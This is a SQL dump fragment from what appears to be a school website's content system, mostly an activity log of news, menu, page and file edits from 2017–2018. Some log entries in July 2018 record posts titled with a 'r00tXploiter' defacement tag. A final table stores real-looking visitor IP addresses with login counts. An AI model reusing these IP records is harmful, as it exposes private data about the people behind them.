INSERT INTO `tb_aktifitas` VALUES (513, 2, 'Menghapus berita ', '2017-05-02 12:03:37');
INSERT INTO `tb_aktifitas` VALUES (514, 2, 'Menghapus berita ', '2017-05-02 12:03:39');
INSERT INTO `tb_aktifitas` VALUES (515, 2, 'Menghapus berita ', '2017-05-02 12:03:41');
INSERT INTO `tb_aktifitas` VALUES (516, 2, 'Menghapus berita ', '2017-05-02 12:03:42');
INSERT INTO `tb_aktifitas` VALUES (517, 2, 'Menghapus berita ', '2017-05-02 12:03:43');
INSERT INTO `tb_aktifitas` VALUES (518, 2, 'Menghapus berita ', '2017-05-02 12:03:44');
INSERT INTO `tb_aktifitas` VALUES (519, 2, 'Menghapus berita ', '2017-05-02 12:03:46');
INSERT INTO `tb_aktifitas` VALUES (520, 2, 'Menghapus berita ', '2017-05-02 12:03:47');
INSERT INTO `tb_aktifitas` VALUES (521, 2, 'Menghapus berita ', '2017-05-02 12:03:48');
INSERT INTO `tb_aktifitas` VALUES (522, 2, 'Menghapus berita ', '2017-05-02 12:03:49');
INSERT INTO `tb_aktifitas` VALUES (523, 2, 'Menghapus berita ', '2017-05-02 12:03:50');
INSERT INTO `tb_aktifitas` VALUES (524, 2, 'Menghapus berita ', '2017-05-02 12:03:52');
INSERT INTO `tb_aktifitas` VALUES (525, 2, 'Menghapus berita ', '2017-05-02 12:03:54');
INSERT INTO `tb_aktifitas` VALUES (526, 2, 'Menghapus berita ', '2017-05-02 12:03:55');
INSERT INTO `tb_aktifitas` VALUES (527, 2, 'Menghapus berita ', '2017-05-02 12:03:56');
INSERT INTO `tb_aktifitas` VALUES (528, 2, 'Menghapus berita ', '2017-05-02 12:03:57');
INSERT INTO `tb_aktifitas` VALUES (529, 2, 'Menghapus berita ', '2017-05-02 12:03:58');
INSERT INTO `tb_aktifitas` VALUES (530, 2, 'Menghapus berita ', '2017-05-02 12:04:01');
INSERT INTO `tb_aktifitas` VALUES (531, 2, 'Menghapus berita ', '2017-05-02 12:04:10');
INSERT INTO `tb_aktifitas` VALUES (532, 2, 'Menghapus berita ', '2017-05-02 12:04:11');
INSERT INTO `tb_aktifitas` VALUES (533, 2, 'Menghapus berita ', '2017-05-02 12:04:15');
INSERT INTO `tb_aktifitas` VALUES (534, 2, 'Menghapus berita ', '2017-05-02 12:04:18');
INSERT INTO `tb_aktifitas` VALUES (535, 2, 'Menghapus berita ', '2017-05-02 12:04:19');
INSERT INTO `tb_aktifitas` VALUES (536, 2, 'Menghapus berita ', '2017-05-02 12:04:20');
INSERT INTO `tb_aktifitas` VALUES (537, 2, 'Menghapus berita ', '2017-05-02 12:04:21');
INSERT INTO `tb_aktifitas` VALUES (538, 2, 'Menghapus berita ', '2017-05-02 12:04:40');
INSERT INTO `tb_aktifitas` VALUES (539, 2, 'Menghapus berita ', '2017-05-02 12:04:41');
INSERT INTO `tb_aktifitas` VALUES (540, 2, 'Menghapus berita ', '2017-05-02 12:04:42');
INSERT INTO `tb_aktifitas` VALUES (541, 2, 'Menghapus berita ', '2017-05-02 12:04:43');
INSERT INTO `tb_aktifitas` VALUES (542, 2, 'Menghapus berita ', '2017-05-02 12:04:43');
INSERT INTO `tb_aktifitas` VALUES (543, 2, 'Menghapus berita ', '2017-05-02 12:04:44');
INSERT INTO `tb_aktifitas` VALUES (544, 2, 'Menghapus berita ', '2017-05-02 12:04:45');
INSERT INTO `tb_aktifitas` VALUES (545, 2, 'Menghapus berita ', '2017-05-02 12:04:46');
INSERT INTO `tb_aktifitas` VALUES (546, 2, 'Menghapus berita ', '2017-05-02 12:04:47');
INSERT INTO `tb_aktifitas` VALUES (547, 2, 'Menghapus berita ', '2017-05-02 12:04:47');
INSERT INTO `tb_aktifitas` VALUES (548, 2, 'Menghapus berita ', '2017-05-02 12:04:52');
INSERT INTO `tb_aktifitas` VALUES (549, 2, 'Menghapus berita ', '2017-05-02 12:04:52');
INSERT INTO `tb_aktifitas` VALUES (550, 2, 'Menghapus berita ', '2017-05-02 12:04:53');
INSERT INTO `tb_aktifitas` VALUES (551, 2, 'Menghapus berita ', '2017-05-02 12:05:14');
INSERT INTO `tb_aktifitas` VALUES (552, 2, 'Menghapus berita ', '2017-05-02 12:05:15');
INSERT INTO `tb_aktifitas` VALUES (553, 2, 'Menghapus berita ', '2017-05-02 12:05:16');
INSERT INTO `tb_aktifitas` VALUES (554, 2, 'Menghapus berita ', '2017-05-02 12:05:17');
INSERT INTO `tb_aktifitas` VALUES (555, 2, 'Menghapus berita ', '2017-05-02 12:05:18');
INSERT INTO `tb_aktifitas` VALUES (556, 2, 'Menghapus berita ', '2017-05-02 12:05:22');
INSERT INTO `tb_aktifitas` VALUES (557, 2, 'Menghapus berita ', '2017-05-02 12:05:23');
INSERT INTO `tb_aktifitas` VALUES (558, 2, 'Menghapus berita ', '2017-05-02 12:05:24');
INSERT INTO `tb_aktifitas` VALUES (559, 2, 'Menghapus berita ', '2017-05-02 12:05:25');
INSERT INTO `tb_aktifitas` VALUES (560, 2, 'Menghapus berita ', '2017-05-02 12:05:26');
INSERT INTO `tb_aktifitas` VALUES (561, 2, 'Menghapus berita ', '2017-05-02 12:05:27');
INSERT INTO `tb_aktifitas` VALUES (562, 2, 'Menghapus berita ', '2017-05-02 12:05:29');
INSERT INTO `tb_aktifitas` VALUES (563, 2, 'Menghapus berita ', '2017-05-02 12:05:31');
INSERT INTO `tb_aktifitas` VALUES (564, 2, 'Menghapus berita ', '2017-05-02 12:05:32');
INSERT INTO `tb_aktifitas` VALUES (565, 2, 'Menghapus berita ', '2017-05-02 12:05:34');
INSERT INTO `tb_aktifitas` VALUES (566, 2, 'Menghapus berita ', '2017-05-02 12:05:35');
INSERT INTO `tb_aktifitas` VALUES (567, 2, 'Menghapus berita ', '2017-05-02 12:05:37');
INSERT INTO `tb_aktifitas` VALUES (568, 2, 'Menghapus berita ', '2017-05-02 12:05:37');
INSERT INTO `tb_aktifitas` VALUES (569, 2, 'Menghapus berita ', '2017-05-02 12:05:38');
INSERT INTO `tb_aktifitas` VALUES (570, 2, 'Menghapus berita ', '2017-05-02 12:05:41');
INSERT INTO `tb_aktifitas` VALUES (571, 2, 'Menghapus berita ', '2017-05-02 12:05:42');
INSERT INTO `tb_aktifitas` VALUES (572, 2, 'Menghapus berita ', '2017-05-02 12:05:44');
INSERT INTO `tb_aktifitas` VALUES (573, 2, 'Menghapus berita ', '2017-05-02 12:05:46');
INSERT INTO `tb_aktifitas` VALUES (574, 2, 'Menghapus berita ', '2017-05-02 12:05:47');
INSERT INTO `tb_aktifitas` VALUES (575, 2, 'Menghapus berita ', '2017-05-02 12:05:48');
INSERT INTO `tb_aktifitas` VALUES (576, 2, 'Menghapus berita ', '2017-05-02 12:05:49');
INSERT INTO `tb_aktifitas` VALUES (577, 2, 'Menghapus berita ', '2017-05-02 12:05:50');
INSERT INTO `tb_aktifitas` VALUES (578, 2, 'Menghapus berita ', '2017-05-02 12:05:51');
INSERT INTO `tb_aktifitas` VALUES (579, 2, 'Menghapus berita ', '2017-05-02 12:05:53');
INSERT INTO `tb_aktifitas` VALUES (580, 2, 'Menghapus berita ', '2017-05-02 12:05:58');
INSERT INTO `tb_aktifitas` VALUES (581, 2, 'Menghapus berita ', '2017-05-02 12:05:59');
INSERT INTO `tb_aktifitas` VALUES (582, 2, 'Menghapus berita ', '2017-05-02 12:06:00');
INSERT INTO `tb_aktifitas` VALUES (583, 2, 'Menghapus berita ', '2017-05-02 12:06:01');
INSERT INTO `tb_aktifitas` VALUES (584, 2, 'Menghapus berita ', '2017-05-02 12:06:02');
INSERT INTO `tb_aktifitas` VALUES (585, 2, 'Menghapus berita ', '2017-05-02 12:06:04');
INSERT INTO `tb_aktifitas` VALUES (586, 2, 'Menghapus berita ', '2017-05-02 12:06:05');
INSERT INTO `tb_aktifitas` VALUES (587, 2, 'Menghapus berita ', '2017-05-02 12:06:06');
INSERT INTO `tb_aktifitas` VALUES (588, 2, 'Menghapus berita ', '2017-05-02 12:06:08');
INSERT INTO `tb_aktifitas` VALUES (589, 2, 'Menghapus berita ', '2017-05-02 12:06:10');
INSERT INTO `tb_aktifitas` VALUES (590, 2, 'Menghapus berita ', '2017-05-02 12:06:11');
INSERT INTO `tb_aktifitas` VALUES (591, 2, 'Menghapus berita ', '2017-05-02 12:06:12');
INSERT INTO `tb_aktifitas` VALUES (592, 2, 'Menghapus berita ', '2017-05-02 12:06:13');
INSERT INTO `tb_aktifitas` VALUES (593, 2, 'Menghapus berita ', '2017-05-02 12:06:14');
INSERT INTO `tb_aktifitas` VALUES (594, 2, 'Menghapus berita ', '2017-05-02 12:06:15');
INSERT INTO `tb_aktifitas` VALUES (595, 2, 'Menghapus berita ', '2017-05-02 12:06:16');
INSERT INTO `tb_aktifitas` VALUES (596, 2, 'Menghapus berita ', '2017-05-02 12:06:17');
INSERT INTO `tb_aktifitas` VALUES (597, 2, 'Menghapus berita ', '2017-05-02 12:06:18');
INSERT INTO `tb_aktifitas` VALUES (598, 2, 'Menghapus berita ', '2017-05-02 12:06:19');
INSERT INTO `tb_aktifitas` VALUES (599, 2, 'Menghapus berita ', '2017-05-02 12:06:19');
INSERT INTO `tb_aktifitas` VALUES (600, 2, 'Menghapus berita ', '2017-05-02 12:06:20');
INSERT INTO `tb_aktifitas` VALUES (601, 2, 'Menghapus berita ', '2017-05-02 12:06:21');
INSERT INTO `tb_aktifitas` VALUES (602, 2, 'Menghapus berita ', '2017-05-02 12:06:21');
INSERT INTO `tb_aktifitas` VALUES (603, 2, 'Menghapus berita ', '2017-05-02 12:06:22');
INSERT INTO `tb_aktifitas` VALUES (604, 2, 'Menghapus berita ', '2017-05-02 12:06:23');
INSERT INTO `tb_aktifitas` VALUES (605, 2, 'Menghapus berita ', '2017-05-02 12:06:24');
INSERT INTO `tb_aktifitas` VALUES (606, 2, 'Menghapus berita ', '2017-05-02 12:06:25');
INSERT INTO `tb_aktifitas` VALUES (607, 2, 'Menghapus berita ', '2017-05-02 12:06:25');
INSERT INTO `tb_aktifitas` VALUES (608, 2, 'Menghapus berita ', '2017-05-02 12:06:26');
INSERT INTO `tb_aktifitas` VALUES (609, 2, 'Menghapus berita ', '2017-05-02 12:06:27');
INSERT INTO `tb_aktifitas` VALUES (610, 2, 'Menghapus berita ', '2017-05-02 12:06:28');
INSERT INTO `tb_aktifitas` VALUES (611, 2, 'Menghapus berita ', '2017-05-02 12:06:28');
INSERT INTO `tb_aktifitas` VALUES (612, 2, 'Menghapus berita ', '2017-05-02 12:06:29');
INSERT INTO `tb_aktifitas` VALUES (613, 2, 'Menghapus berita ', '2017-05-02 12:06:30');
INSERT INTO `tb_aktifitas` VALUES (614, 2, 'Menghapus berita ', '2017-05-02 12:06:31');
INSERT INTO `tb_aktifitas` VALUES (615, 2, 'Menghapus berita ', '2017-05-02 12:06:31');
INSERT INTO `tb_aktifitas` VALUES (616, 2, 'Menghapus berita ', '2017-05-02 12:06:32');
INSERT INTO `tb_aktifitas` VALUES (617, 2, 'Menghapus berita ', '2017-05-02 12:06:33');
INSERT INTO `tb_aktifitas` VALUES (618, 2, 'Menghapus berita ', '2017-05-02 12:06:33');
INSERT INTO `tb_aktifitas` VALUES (619, 2, 'Menghapus berita ', '2017-05-02 12:06:34');
INSERT INTO `tb_aktifitas` VALUES (620, 2, 'Menghapus berita ', '2017-05-02 12:06:35');
INSERT INTO `tb_aktifitas` VALUES (621, 2, 'Menghapus berita ', '2017-05-02 12:06:36');
INSERT INTO `tb_aktifitas` VALUES (622, 2, 'Menghapus berita ', '2017-05-02 12:06:36');
INSERT INTO `tb_aktifitas` VALUES (623, 2, 'Menghapus berita ', '2017-05-02 12:06:37');
INSERT INTO `tb_aktifitas` VALUES (624, 2, 'Menghapus berita ', '2017-05-02 12:06:38');
INSERT INTO `tb_aktifitas` VALUES (625, 2, 'Menghapus berita ', '2017-05-02 12:06:39');
INSERT INTO `tb_aktifitas` VALUES (626, 2, 'Menghapus berita ', '2017-05-02 12:06:39');
INSERT INTO `tb_aktifitas` VALUES (627, 2, 'Menghapus berita ', '2017-05-02 12:06:40');
INSERT INTO `tb_aktifitas` VALUES (628, 2, 'Menghapus berita ', '2017-05-02 12:06:41');
INSERT INTO `tb_aktifitas` VALUES (629, 2, 'Menghapus berita ', '2017-05-02 12:06:42');
INSERT INTO `tb_aktifitas` VALUES (630, 2, 'Menghapus berita ', '2017-05-02 12:06:42');
INSERT INTO `tb_aktifitas` VALUES (631, 2, 'Menghapus berita ', '2017-05-02 12:06:43');
INSERT INTO `tb_aktifitas` VALUES (632, 2, 'Menghapus berita ', '2017-05-02 12:06:44');
INSERT INTO `tb_aktifitas` VALUES (633, 2, 'Menghapus berita ', '2017-05-02 12:06:44');
INSERT INTO `tb_aktifitas` VALUES (634, 2, 'Menghapus berita ', '2017-05-02 12:06:45');
INSERT INTO `tb_aktifitas` VALUES (635, 2, 'Menghapus berita ', '2017-05-02 12:06:46');
INSERT INTO `tb_aktifitas` VALUES (636, 2, 'Menghapus berita ', '2017-05-02 12:06:46');
INSERT INTO `tb_aktifitas` VALUES (637, 2, 'Menghapus berita ', '2017-05-02 12:06:47');
INSERT INTO `tb_aktifitas` VALUES (638, 2, 'Menghapus berita ', '2017-05-02 12:06:48');
INSERT INTO `tb_aktifitas` VALUES (639, 2, 'Menghapus berita ', '2017-05-02 12:06:48');
INSERT INTO `tb_aktifitas` VALUES (640, 2, 'Menghapus berita ', '2017-05-02 12:06:49');
INSERT INTO `tb_aktifitas` VALUES (641, 2, 'Menghapus berita ', '2017-05-02 12:06:50');
INSERT INTO `tb_aktifitas` VALUES (642, 2, 'Menghapus berita ', '2017-05-02 12:06:51');
INSERT INTO `tb_aktifitas` VALUES (643, 2, 'Menghapus berita ', '2017-05-02 12:06:51');
INSERT INTO `tb_aktifitas` VALUES (644, 2, 'Menghapus berita ', '2017-05-02 12:06:52');
INSERT INTO `tb_aktifitas` VALUES (645, 2, 'Menghapus berita ', '2017-05-02 12:06:53');
INSERT INTO `tb_aktifitas` VALUES (646, 2, 'Menghapus berita ', '2017-05-02 12:06:54');
INSERT INTO `tb_aktifitas` VALUES (647, 2, 'Menghapus berita ', '2017-05-02 12:06:55');
INSERT INTO `tb_aktifitas` VALUES (648, 2, 'Menghapus berita ', '2017-05-02 12:06:55');
INSERT INTO `tb_aktifitas` VALUES (649, 2, 'Menghapus berita ', '2017-05-02 12:06:56');
INSERT INTO `tb_aktifitas` VALUES (650, 2, 'Menghapus berita ', '2017-05-02 12:06:57');
INSERT INTO `tb_aktifitas` VALUES (651, 2, 'Menghapus berita ', '2017-05-02 12:06:58');
INSERT INTO `tb_aktifitas` VALUES (652, 2, 'Menghapus berita ', '2017-05-02 12:06:58');
INSERT INTO `tb_aktifitas` VALUES (653, 2, 'Menghapus berita ', '2017-05-02 12:06:59');
INSERT INTO `tb_aktifitas` VALUES (654, 2, 'Menghapus berita ', '2017-05-02 12:07:00');
INSERT INTO `tb_aktifitas` VALUES (655, 2, 'Menghapus berita ', '2017-05-02 12:07:01');
INSERT INTO `tb_aktifitas` VALUES (656, 2, 'Menghapus berita ', '2017-05-02 12:07:01');
INSERT INTO `tb_aktifitas` VALUES (657, 2, 'Menghapus berita ', '2017-05-02 12:07:02');
INSERT INTO `tb_aktifitas` VALUES (658, 2, 'Menghapus berita ', '2017-05-02 12:07:03');
INSERT INTO `tb_aktifitas` VALUES (659, 2, 'Menghapus berita ', '2017-05-02 12:07:04');
INSERT INTO `tb_aktifitas` VALUES (660, 2, 'Menghapus berita ', '2017-05-02 12:07:05');
INSERT INTO `tb_aktifitas` VALUES (661, 2, 'Menghapus berita ', '2017-05-02 12:07:05');
INSERT INTO `tb_aktifitas` VALUES (662, 2, 'Menghapus berita ', '2017-05-02 12:07:06');
INSERT INTO `tb_aktifitas` VALUES (663, 2, 'Menghapus berita ', '2017-05-02 12:07:07');
INSERT INTO `tb_aktifitas` VALUES (664, 2, 'Menghapus berita ', '2017-05-02 12:07:09');
INSERT INTO `tb_aktifitas` VALUES (665, 2, 'Menghapus berita ', '2017-05-02 12:07:12');
INSERT INTO `tb_aktifitas` VALUES (666, 2, 'Menghapus berita ', '2017-05-02 12:07:20');
INSERT INTO `tb_aktifitas` VALUES (667, 2, 'Menghapus berita ', '2017-05-02 12:07:21');
INSERT INTO `tb_aktifitas` VALUES (668, 2, 'Menghapus berita ', '2017-05-02 12:07:21');
INSERT INTO `tb_aktifitas` VALUES (669, 2, 'Menghapus berita ', '2017-05-02 12:07:22');
INSERT INTO `tb_aktifitas` VALUES (670, 4, 'Menghapus menu ', '2018-05-12 12:12:36');
INSERT INTO `tb_aktifitas` VALUES (671, 4, 'Menambah menu ', '2018-05-12 12:14:05');
INSERT INTO `tb_aktifitas` VALUES (672, 4, 'Menambah Berita \'PENERIMAAN PESERTA DIDIK BARU TAHUN PELAJARAN 2018/2019\' ', '2018-05-12 12:16:46');
INSERT INTO `tb_aktifitas` VALUES (673, 4, 'Menambah Berita \'PENERIMAAN PESERTA DIDIK BARU TAHUN PELAJARAN 2018/2019\' ', '2018-05-12 12:18:41');
INSERT INTO `tb_aktifitas` VALUES (674, 4, 'Menambah Berita \'Tutorial Pengisian Formulir PPDB Online 2018\' ', '2018-05-26 14:08:04');
INSERT INTO `tb_aktifitas` VALUES (675, 4, 'Menambah Berita \'Tutorial Pengisian Formulir PPDB Online 2018\' ', '2018-05-26 14:11:16');
INSERT INTO `tb_aktifitas` VALUES (676, 4, 'Menambah Berita \'Tutorial Pengisian Formulir PPDB Online 2018\' ', '2018-05-26 14:13:15');
INSERT INTO `tb_aktifitas` VALUES (677, 4, 'Menambah Berita \'Tutorial Pengisian Formulir PPDB Online 2018\' ', '2018-05-26 14:16:46');
INSERT INTO `tb_aktifitas` VALUES (678, 4, 'Menambah Berita \'Tutorial Pengisian Formulir PPDB Online 2018\' ', '2018-05-26 14:17:31');
INSERT INTO `tb_aktifitas` VALUES (679, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-05-26 14:19:42');
INSERT INTO `tb_aktifitas` VALUES (680, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-05-28 08:44:29');
INSERT INTO `tb_aktifitas` VALUES (681, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-05-28 08:46:26');
INSERT INTO `tb_aktifitas` VALUES (682, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-05-28 08:49:15');
INSERT INTO `tb_aktifitas` VALUES (683, 4, 'Menghapus berita ', '2018-05-28 08:52:29');
INSERT INTO `tb_aktifitas` VALUES (684, 4, 'Menghapus berita ', '2018-05-28 08:52:31');
INSERT INTO `tb_aktifitas` VALUES (685, 4, 'Menghapus berita ', '2018-05-28 08:52:32');
INSERT INTO `tb_aktifitas` VALUES (686, 4, 'Menghapus berita ', '2018-05-28 08:52:33');
INSERT INTO `tb_aktifitas` VALUES (687, 4, 'Menghapus berita ', '2018-05-28 08:52:34');
INSERT INTO `tb_aktifitas` VALUES (688, 4, 'Menghapus berita ', '2018-05-28 08:52:35');
INSERT INTO `tb_aktifitas` VALUES (689, 4, 'Menghapus berita ', '2018-05-28 08:52:39');
INSERT INTO `tb_aktifitas` VALUES (690, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-05-28 08:57:26');
INSERT INTO `tb_aktifitas` VALUES (691, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-05-28 09:00:20');
INSERT INTO `tb_aktifitas` VALUES (692, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-05-28 09:21:54');
INSERT INTO `tb_aktifitas` VALUES (693, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-05-28 09:27:10');
INSERT INTO `tb_aktifitas` VALUES (694, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-05-28 11:17:55');
INSERT INTO `tb_aktifitas` VALUES (695, 4, 'Menambah Berita \'dsfdfssdfghjh\' ', '2018-06-25 23:56:09');
INSERT INTO `tb_aktifitas` VALUES (696, 4, 'Mengubah Status berita ', '2018-06-25 23:56:20');
INSERT INTO `tb_aktifitas` VALUES (697, 4, 'Menambah Berita \'okkkkiiii2\' ', '2018-06-26 06:14:48');
INSERT INTO `tb_aktifitas` VALUES (698, 4, 'Mengubah Status berita ', '2018-06-26 06:15:09');
INSERT INTO `tb_aktifitas` VALUES (699, 4, 'Menambah Slider ', '2018-07-10 15:39:51');
INSERT INTO `tb_aktifitas` VALUES (700, 20, 'Menghapus Slider ', '2018-07-10 15:41:50');
INSERT INTO `tb_aktifitas` VALUES (701, 4, 'Menambah menu ', '2018-07-10 16:05:20');
INSERT INTO `tb_aktifitas` VALUES (702, 4, 'Menghapus menu ', '2018-07-10 16:36:47');
INSERT INTO `tb_aktifitas` VALUES (703, 4, 'Menghapus menu ', '2018-07-12 01:22:36');
INSERT INTO `tb_aktifitas` VALUES (704, 4, 'Menhapus File ', '2018-07-12 22:24:17');
INSERT INTO `tb_aktifitas` VALUES (705, 4, 'Menhapus File ', '2018-07-12 22:24:27');
INSERT INTO `tb_aktifitas` VALUES (706, 4, 'Menhapus File ', '2018-07-12 22:24:57');
INSERT INTO `tb_aktifitas` VALUES (707, 4, 'Menhapus File ', '2018-07-12 22:25:24');
INSERT INTO `tb_aktifitas` VALUES (708, 4, 'Menambah Berita \'Touched ??????\' ', '2018-07-14 10:56:39');
INSERT INTO `tb_aktifitas` VALUES (709, 4, 'Menambah Berita \'Panduan Pengisian Formulir PPDB Online 2018\' ', '2018-07-15 17:10:51');
INSERT INTO `tb_aktifitas` VALUES (710, 4, 'Menambah Berita \'Touched ???\' ', '2018-07-15 17:18:39');
INSERT INTO `tb_aktifitas` VALUES (711, 4, 'Menambah Berita \'Touched ??? r00tXploiter in Your System\' ', '2018-07-15 17:19:50');
INSERT INTO `tb_aktifitas` VALUES (712, 4, 'Menambah Berita \'Touched ??? r00tXploiter in Your System\' ', '2018-07-15 17:21:16');
INSERT INTO `tb_aktifitas` VALUES (713, 4, 'Menghapus berita ', '2018-07-16 19:14:00');
INSERT INTO `tb_aktifitas` VALUES (714, 4, 'Menghapus berita ', '2018-07-16 19:14:10');
INSERT INTO `tb_aktifitas` VALUES (715, 4, 'Menghapus berita ', '2018-07-16 19:14:13');
INSERT INTO `tb_aktifitas` VALUES (716, 4, 'Menghapus berita ', '2018-07-16 19:14:16');
INSERT INTO `tb_aktifitas` VALUES (717, 4, 'Menghapus berita ', '2018-07-16 19:14:17');
INSERT INTO `tb_aktifitas` VALUES (718, 4, 'Menambah Halaman \'profil-smk-n-1-jenangan-ponorogo\' ', '2018-07-16 19:16:38');
INSERT INTO `tb_aktifitas` VALUES (719, 4, 'Menambah Halaman \'profil smkn 1 jenangan ponorogo\' ', '2018-07-16 19:17:49');
INSERT INTO `tb_aktifitas` VALUES (720, 4, 'Menghapus halaman ID: \'732\' ', '2018-07-16 19:21:29');
INSERT INTO `tb_aktifitas` VALUES (721, 4, 'Menghapus berita ', '2018-07-16 19:21:36');
INSERT INTO `tb_aktifitas` VALUES (722, 4, 'Menambah Berita \'TANAMKAN PRAKTIK DEMOKRASI DENGAN PILKASIS\' ', '2018-08-06 11:41:45');
INSERT INTO `tb_aktifitas` VALUES (723, 4, 'Menambah Berita \'TANAMKAN PRAKTIK DEMOKRASI DENGAN PILKASIS\' ', '2018-08-07 06:19:17');
INSERT INTO `tb_aktifitas` VALUES (724, 4, 'Mengubah Status berita ', '2018-08-08 09:35:07');
INSERT INTO `tb_aktifitas` VALUES (725, 4, 'Mengubah Status berita ', '2018-08-08 09:38:08');
INSERT INTO `tb_aktifitas` VALUES (726, 4, 'Menhapus File ', '2018-08-08 09:42:54');
INSERT INTO `tb_aktifitas` VALUES (727, 4, 'Menhapus File ', '2018-08-08 09:42:58');
INSERT INTO `tb_aktifitas` VALUES (728, 4, 'Menhapus File ', '2018-08-08 09:43:02');
INSERT INTO `tb_aktifitas` VALUES (729, 4, 'Menhapus File ', '2018-08-08 09:43:21');
INSERT INTO `tb_aktifitas` VALUES (730, 4, 'Menhapus File ', '2018-08-29 21:07:16');
INSERT INTO `tb_aktifitas` VALUES (731, 4, 'Menambah Berita \'Perpustakaan\' ', '2018-08-30 08:47:35');
INSERT INTO `tb_aktifitas` VALUES (732, 4, 'Menghapus berita ', '2018-08-30 08:49:46');
INSERT INTO `tb_aktifitas` VALUES (733, 4, 'Menambah Berita \'Perpustakaan\' ', '2018-08-30 08:50:45');
INSERT INTO `tb_aktifitas` VALUES (734, 4, 'Menambah Berita \'Perpustakaan\' ', '2018-08-30 08:50:52');
INSERT INTO `tb_aktifitas` VALUES (735, 4, 'Mengubah Status berita ', '2018-08-30 08:59:58');
INSERT INTO `tb_aktifitas` VALUES (736, 4, 'Mengubah Status berita ', '2018-08-30 09:00:07');
INSERT INTO `tb_aktifitas` VALUES (737, 4, 'Menambah Halaman \'Contact us\' ', '2018-08-30 09:02:33');
INSERT INTO `tb_aktifitas` VALUES (738, 4, 'Menambah Halaman \'Contact us\' ', '2018-08-30 09:03:09');
INSERT INTO `tb_aktifitas` VALUES (739, 4, 'Menambah Halaman \'Contact us\' ', '2018-08-30 09:03:14');
INSERT INTO `tb_aktifitas` VALUES (740, 4, 'Menambah Halaman \'tes halaman\' ', '2018-08-30 09:04:13');
INSERT INTO `tb_aktifitas` VALUES (741, 4, 'Menambah Halaman \'tes halaman\' ', '2018-08-30 09:04:29');
INSERT INTO `tb_aktifitas` VALUES (742, 4, 'Menhapus File ', '2018-08-30 09:15:19');
INSERT INTO `tb_aktifitas` VALUES (743, 4, 'Menhapus File ', '2018-08-30 09:16:10');
INSERT INTO `tb_aktifitas` VALUES (744, 4, 'Menhapus File ', '2018-08-30 09:16:10');
INSERT INTO `tb_aktifitas` VALUES (745, 4, 'Menhapus File ', '2018-08-30 09:35:40');
INSERT INTO `tb_aktifitas` VALUES (746, 4, 'Menhapus File ', '2018-08-30 09:36:00');
INSERT INTO `tb_aktifitas` VALUES (747, 4, 'Menhapus File ', '2018-08-30 09:36:05');
INSERT INTO `tb_aktifitas` VALUES (748, 4, 'Menhapus File ', '2018-08-30 09:38:11');
INSERT INTO `tb_aktifitas` VALUES (749, 4, 'Menhapus File ', '2018-08-30 09:38:46');
INSERT INTO `tb_aktifitas` VALUES (750, 4, 'Menhapus File ', '2018-08-30 09:38:51');
INSERT INTO `tb_aktifitas` VALUES (751, 4, 'Menhapus File ', '2018-08-30 09:39:22');
INSERT INTO `tb_aktifitas` VALUES (752, 4, 'Menhapus File ', '2018-08-30 09:39:25');
INSERT INTO `tb_aktifitas` VALUES (753, 4, 'Menhapus File ', '2018-08-30 09:39:26');
INSERT INTO `tb_aktifitas` VALUES (754, 4, 'Menhapus File ', '2018-08-30 09:39:27');
INSERT INTO `tb_aktifitas` VALUES (755, 4, 'Menhapus File ', '2018-08-30 09:39:29');
INSERT INTO `tb_aktifitas` VALUES (756, 4, 'Menhapus File ', '2018-08-30 09:40:01');
INSERT INTO `tb_aktifitas` VALUES (757, 4, 'Menhapus File ', '2018-08-30 09:40:23');
INSERT INTO `tb_aktifitas` VALUES (758, 4, 'Menhapus File ', '2018-08-30 09:40:24');
INSERT INTO `tb_aktifitas` VALUES (759, 4, 'Menhapus File ', '2018-08-30 09:40:25');
INSERT INTO `tb_aktifitas` VALUES (760, 4, 'Menhapus File ', '2018-08-30 09:40:27');
INSERT INTO `tb_aktifitas` VALUES (761, 4, 'Menhapus File ', '2018-08-30 09:40:38');
INSERT INTO `tb_aktifitas` VALUES (762, 4, 'Menhapus File ', '2018-08-30 09:41:06');
INSERT INTO `tb_aktifitas` VALUES (763, 4, 'Menhapus File ', '2018-08-30 09:41:07');
INSERT INTO `tb_aktifitas` VALUES (764, 4, 'Menhapus File ', '2018-08-30 09:41:09');
INSERT INTO `tb_aktifitas` VALUES (765, 4, 'Menambah Berita \'Terjamin, LG Single Commercial AC dapat Sertifikat Hemat Energi dari UI\' ', '2018-08-30 15:42:21');
INSERT INTO `tb_aktifitas` VALUES (766, 4, 'Menambah Berita \'Terjamin, LG Single Commercial AC dapat Sertifikat Hemat Energi dari UI\' ', '2018-08-30 15:44:06');

-- ----------------------------
-- Table structure for tb_auth_mac
-- ----------------------------
DROP TABLE IF EXISTS `tb_auth_mac`;
CREATE TABLE `tb_auth_mac`  (
  `mac` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `count` int(11) NOT NULL,
  `ip` varchar(0) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `date` date NOT NULL,
  PRIMARY KEY (`mac`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_auth_mac
-- ----------------------------
INSERT INTO `tb_auth_mac` VALUES ('103.213.128.168', 4, '', '2018-03-21');
INSERT INTO `tb_auth_mac` VALUES ('103.28.114.3', 4, '', '2018-08-14');
INSERT INTO `tb_auth_mac` VALUES ('112.215.154.104', 4, '', '2018-07-17');
INSERT INTO `tb_auth_mac` VALUES ('114.125.110.237', 1, '', '2018-08-29');
INSERT INTO `tb_auth_mac` VALUES ('114.125.127.190', 1, '', '2018-08-29');
INSERT INTO `tb_auth_mac` VALUES ('115.178.251.25', 4, '', '2018-08-07');
INSERT INTO `tb_auth_mac` VALUES ('120.188.80.26', 1, '', '2018-07-13');
INSERT INTO `tb_auth_mac` VALUES ('125.167.56.144', 4, '', '2018-07-10');
